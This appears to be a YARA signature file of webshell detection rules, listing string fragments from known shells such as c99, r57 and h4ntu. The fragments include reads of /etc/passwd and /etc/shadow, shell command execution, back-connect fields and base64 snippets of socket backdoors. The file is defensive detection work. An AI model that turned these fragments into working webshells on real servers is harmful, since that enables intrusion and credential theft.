rule Webshell_sh_php_php_RID2ECF : DEMO SCRIPT T1087_001 T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file sh.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:30:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1087_001, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$ar_file=array('/etc/passwd','/etc/shadow','/etc/master.passwd','/etc/fstab','/e" 
      $s2 = "Show <input type=text size=5 value=\".((isset($_POST['br_st']))?$_POST['br_st']:" 
   condition: 
      1 of them
}

rule Webshell_phpbackdoor15_php_RID3140 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file phpbackdoor15.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:14:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "echo \"fichier telecharge dans \".good_link(\"./\".$_FILES[\"fic\"][\"na" 
      $s2 = "if(move_uploaded_file($_FILES[\"fic\"][\"tmp_name\"],good_link(\"./\".$_FI" 
      $s3 = "echo \"Cliquez sur un nom de fichier pour lancer son telechargement. Cliquez s" 
   condition: 
      1 of them
}

rule Webshell_sql_php_php_RID2F44 : DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file sql.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:49:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2025-07-04"
      tags = "DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "fputs ($fp, \"# RST MySQL tools\\r\\n# Home page: http://rst.void.ru\\r\\n#" 
      $s2 = "http://rst.void.ru" 
      $s3 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&" 
   condition: 
      1 of them and not uint32 ( 0 ) == 0x6D783F3C
}

rule Webshell_cgi_python_py_RID3022 : DEMO SCRIPT T1059_006 T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file cgi-python.py.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:26:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1059_006, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "a CGI by Fuzzyman" 
      $s1 = "\"\"\"+fontline +\"Version : \" + versionstring + \"\"\", Running on : \"\"\" + " 
      $s2 = "values = map(lambda x: x.value, theform[field])     # allows for" 
   condition: 
      1 of them
}

rule Webshell_ru24_post_sh_php_php_RID32A0 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file ru24_post_sh.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:13:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<title>Ru24PostWebShell - \".$_POST['cmd'].\"</title>" fullword
      $s3 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a" 
      $s4 = "Writed by DreAmeRz" fullword
   condition: 
      1 of them
}

rule Webshell_DTool_Pro_php_RID2FBF : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file DTool Pro.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:10:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "r3v3ng4ns\\nDigite" 
      $s1 = "if(!@opendir($chdir)) $ch_msg=\"dtool: line 1: chdir: It seems that the permissi" 
      $s3 = "if (empty($cmd) and $ch_msg==\"\") echo (\"Comandos Exclusivos do DTool Pro\\n" 
   condition: 
      1 of them
}

rule Webshell_php_include_w_shell_php_RID3425 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file php-include-w-shell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:18:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$dataout .= \"<td><a href='$MyLoc?$SREQ&incdbhost=$myhost&incdbuser=$myuser&incd" 
      $s1 = "if($run == 1 && $phpshellapp && $phpshellhost && $phpshellport) $strOutput .= DB" 
   condition: 
      1 of them
}

rule Webshell_shell_php_php_RID300C : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file shell.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:23:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "/* We have found the parent dir. We must be carefull if the parent " fullword
      $s2 = "$tmpfile = tempnam('/tmp', 'phpshell');" 
      $s3 = "if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {" fullword
   condition: 
      1 of them
}

rule Webshell_ironshell_php_RID301D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file ironshell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:26:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "www.ironwarez.info" 
      $s1 = "$cookiename = \"wieeeee\";" 
      $s2 = "~ Shell I" 
      $s3 = "www.rootshell-team.info" 
      $s4 = "setcookie($cookiename, $_POST['pass'], time()+3600);" 
   condition: 
      1 of them
}

rule WEBSHELL_H4ntu_Shell_Powered_Tsoi_RID3323 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file h4ntu shell [powered by tsoi].txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:35:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2025-03-21"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "<title>h4ntu shell" 
      $x2 = "system(\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\");" 
   condition: 
      filesize < 100KB and 1 of them
}

rule Webshell_MySQL_Web_Interface_Version_0_8_php_RID37DB : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file MySQL Web Interface Version 0.8.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 17:56:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "SooMin Kim" 
      $s1 = "http://popeye.snu.ac.kr/~smkim/mysql" 
      $s2 = "href='$PHP_SELF?action=dropField&dbname=$dbname&tablename=$tablename" 
      $s3 = "<th>Type</th><th>&nbspM&nbsp</th><th>&nbspD&nbsp</th><th>unsigned</th><th>zerofi" 
   condition: 
      2 of them
}

rule Webshell__1_c2007_php_php_c100_php_RID3309 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files 1.txt, c2007.php.php.txt, c100.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:30:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d089e7168373a0634e1ac18c0ee00085"
      hash2 = "38fd7e45f9c11a37463c3ded1c76af4c"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\"" 
      $s3 = "echo \"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur" 
   condition: 
      1 of them
}

rule Webshell_nst_perl_proxy_shell_RID3325 : DEMO SCRIPT T1090 T1105 T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files nst.php.php.txt, img.php.php.txt, nstview.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:35:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "17a07bb84e137b8aa60f87cd6bfab748"
      hash2 = "4745d510fed4378e4b1730f56f25e569"
      tags = "DEMO, SCRIPT, T1090, T1105, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><i" 
      $s1 = "$perl_proxy_scp = \"IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4v" 
      $s2 = "<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input" 
   condition: 
      1 of them
}

rule Webshell_network_php_xinfo_RID31DA : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files network.php.php.txt, xinfo.php.php.txt, nfm.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:40:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2601b6fc1579f263d2f3960ce775df70"
      hash2 = "401fbae5f10283051c39e640b77e4c26"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = ".textbox { background: White; border: 1px #000000 solid; color: #000099; font-fa" 
      $s2 = "<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value=''" 
   condition: 
      all of them
}

rule Webshell_SpecialShell_99_php_php_RID337E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:50:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3ca5886cd54d495dc95793579611f59a"
      hash2 = "9c5bb5e3a46ec28039e8986324e42792"
      hash3 = "09609851caa129e40b0d56e90dfc476c"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "echo \"<hr size=\\\"1\\\" noshade><b>Done!</b><br>Total time (secs.): \".$ft" 
      $s3 = "$fqb_log .= \"\\r\\n------------------------------------------\\r\\nDone!\\r" 
   condition: 
      1 of them
}

rule Webshell_r577_php_php_SnIpEr_2_RID322A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:53:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "911195a9b7c010f61b66439d9048f400"
      hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
      hash3 = "8023394542cddf8aee5dec6072ed02b5"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner o" 
      $s4 = "if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult" 
   condition: 
      1 of them
}

rule Webshell_c99shell_v1_0_RID2F28 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt, ctt_sh.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:45:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
      hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
      hash3 = "671cad517edd254352fe7e0c7c981c39"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "\"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze\"" 
      $s2 = "\"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm\"" 
      $s4 = "\"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo\"" 
   condition: 
      2 of them
}

rule Webshell_r577_php_spy_RID2F1D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files r577.php.php.txt, spy.php.php.txt, s.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:43:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "eed14de3907c9aa2550d95550d1a2d5f"
      hash2 = "817671e1bdc85e04cc3440bbd9288800"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['" 
      $s3 = "echo sr(45,\"<b>\".$lang[$language.'_text80'].$arrow.\"</b>\",\"<select name=db>" 
   condition: 
      1 of them
}

rule Webshell_c99_generic_RID2EB7 : DEMO GEN T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated "
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:26:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3ca5886cd54d495dc95793579611f59a"
      hash2 = "9c5bb5e3a46ec28039e8986324e42792"
      hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
      tags = "DEMO, GEN, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "  if ($copy_unset) {foreach($sess_data[\"copy\"] as $k=>$v) {unset($sess_data[\"" 
      $s1 = "  if (file_exists($mkfile)) {echo \"<b>Make File \\\"\".htmlspecialchars($mkfile" 
      $s2 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_pr" 
      $s3 = "  elseif (!fopen($mkfile,\"w\")) {echo \"<b>Make File \\\"\".htmlspecialchars($m" 
   condition: 
      all of them
}

rule Webshell_SpecialShell_99a_RID3091 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated "
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:45:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3ca5886cd54d495dc95793579611f59a"
      hash2 = "9c5bb5e3a46ec28039e8986324e42792"
      hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$sess_data[\"cut\"] = array(); c99_s" 
      $s3 = "if ((!eregi(\"http://\",$uploadurl)) and (!eregi(\"https://\",$uploadurl))" 
   condition: 
      1 of them
}

rule Webshell_SpecialShell_99b_RID3092 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:45:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9c5bb5e3a46ec28039e8986324e42792"
      hash2 = "09609851caa129e40b0d56e90dfc476c"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "\"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur" 
      $s2 = "c99sh_sqlquery" 
   condition: 
      1 of them
}

rule Webshell_SpecialShell_99c_RID3093 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:45:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3ca5886cd54d495dc95793579611f59a"
      hash2 = "9c5bb5e3a46ec28039e8986324e42792"
      hash3 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "else {$act = \"f\"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPA" 
      $s3 = "else {echo \"<b>File \\\"\".$sql_getfile.\"\\\":</b><br>\".nl2br(htmlspec" 
   condition: 
      1 of them
}

rule WEBSHEL_PHP_Generic_Mar14_RID2F62 : DEMO GEN T1505_003 WEBSHELL {
   meta:
      description = "Detects PHP webshell"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:54:51"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-05-12"
      hash1 = "f51a5c5775d9cca0b137ddb28ff3831f4f394b7af6f6a868797b0df3dcdb01ba"
      hash2 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
      hash3 = "9ecdb14b41785c779d9721e11bf9e1b7e35611015f4aabf9a1f54a82eaa0725c"
      tags = "DEMO, GEN, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "echo sr(15,\"<b>\".$lang[$language.'_text" 
      $s1 = ".$arrow.\"</b>\",in('text','" 
   condition: 
      2 of them
}

rule Webshell_r577_php_php_SnIpEr_RID3199 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:29:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "911195a9b7c010f61b66439d9048f400"
      hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash'," fullword
      $s1 = "$name='ec371748dc2da624b35a4f8f685dd122'" 
      $s2 = "rst.void.ru" 
   condition: 
      3 of them
}

rule Webshell_SpecialShell_99_php_php_c100_php_RID3678 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt, c100.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 16:57:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "44542e5c3e9790815c49d5f9beffbbf2"
      hash2 = "09609851caa129e40b0d56e90dfc476c"
      hash3 = "38fd7e45f9c11a37463c3ded1c76af4c"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "if(eregi(\"./shbd $por\",$scan))" 
      $s1 = "$_POST['backconnectip']" 
      $s2 = "$_POST['backcconnmsg']" 
   condition: 
      1 of them
}

rule Webshell_r577_php_RID2D62 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files r577.php.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 10:29:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
      hash2 = "8023394542cddf8aee5dec6072ed02b5"
      hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "if(rmdir($_POST['mk_name']))" 
      $s2 = "$r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td>" 
      $s3 = "if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cell" 
   condition: 
      2 of them
}

rule Webshell_multiple_php_webshells_RID33E1 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files multiple_php_webshells"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:06:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "911195a9b7c010f61b66439d9048f400"
      hash2 = "be0f67f3e995517d18859ed57b4b4389"
      hash3 = "eddf7a8fde1e50a7f2a817ef7cece24f"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI" 
      $s2 = "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0" 
      $s4 = "A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg" 
   condition: 
      2 of them
}

rule Webshell_c99madshell_v2_RID2FCC : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:12:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3ca5886cd54d495dc95793579611f59a"
      hash2 = "9c5bb5e3a46ec28039e8986324e42792"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<b>Dumped! Dump has been writed to " 
      $s1 = "if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo \"<TABLE st" 
      $s2 = "<input type=submit name=actarcbuff value=\\\"Pack buffer to archive" 
   condition: 
      1 of them
}

rule Webshell_GFS_web_shell_ver_3_1_7_RID32FE : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files GFS web-shell ver 3.1.7 - PRiV8.php.txt, nshell.php.php.txt, gfs_sh.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:28:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4a44d82da21438e32d4f514ab35c26b6"
      hash2 = "f618f41f7ebeb5e5076986a66593afd1"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "echo $uname.\"</font><br><b>\";" fullword
      $s3 = "while(!feof($f)) { $res.=fread($f,1024); }" fullword
      $s4 = "echo \"user=\".@get_current_user().\" uid=\".@getmyuid().\" gid=\".@getmygid()" 
   condition: 
      2 of them
}

rule Webshell_c99shell_v1_0_99_RID2FF9 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, SpecialShell_99.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:20:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3ca5886cd54d495dc95793579611f59a"
      hash2 = "9c5bb5e3a46ec28039e8986324e42792"
      hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "c99ftpbrutecheck" 
      $s1 = "$ftpquick_t = round(getmicrotime()-$ftpquick_st,4);" fullword
      $s2 = "$fqb_lenght = $nixpwdperpage;" fullword
      $s3 = "$sock = @ftp_connect($host,$port,$timeout);" fullword
   condition: 
      2 of them
}

rule Webshell_SpecialShell_99d_RID3094 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, SpecialShell_99.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:45:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9c5bb5e3a46ec28039e8986324e42792"
      hash2 = "d8ae5819a0a2349ec552cbcf3a62c975"
      hash3 = "9e9ae0332ada9c3797d6cee92c2ede62"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$sqlquicklaunch[] = array(\"" 
      $s1 = "else {echo \"<center><b>File does not exists (\".htmlspecialchars($d.$f).\")!<" 
   condition: 
      all of them
}

rule Webshell_Fatalshell_php_RID304D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files antichat.php.php.txt, Fatalshell.php.php.txt, a_gedit.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:34:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "b15583f4eaad10a25ef53ab451a4a26d"
      hash2 = "ab9c6b24ca15f4a1b7086cad78ff0f78"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "if(@$_POST['save'])writef($file,$_POST['data']);" fullword
      $s1 = "if($action==\"phpeval\"){" fullword
      $s2 = "$uploadfile = $dirupload.\"/\".$_POST['filename'];" fullword
      $s3 = "$dir=getcwd().\"/\";" fullword
   condition: 
      2 of them
}

rule Webshell_c99shell_v1_0_SsEs_RID3105 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:04:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
      hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "if (!empty($delerr)) {echo \"<b>Deleting with errors:</b><br>\".$delerr;}" fullword
   condition: 
      1 of them
}

rule Webshell_Crystal_php_nshell_RID3214 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files Crystal.php.txt, nshell.php.php.txt, load_shell.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:49:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4a44d82da21438e32d4f514ab35c26b6"
      hash2 = "0c5d227f4aa76785e4760cdcff78a661"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "if ($filename != \".\" and $filename != \"..\"){" fullword
      $s1 = "$dires = $dires . $directory;" fullword
      $s4 = "$arr = array_merge($arr, glob(\"*\"));" fullword
   condition: 
      2 of them
}

rule Webshell_nst_php_cybershell_RID322E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files nst.php.php.txt, cybershell.php.php.txt, img.php.php.txt, nstview.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:54:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ef8828e0bc0641a655de3932199c0527"
      hash2 = "17a07bb84e137b8aa60f87cd6bfab748"
      hash3 = "4745d510fed4378e4b1730f56f25e569"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
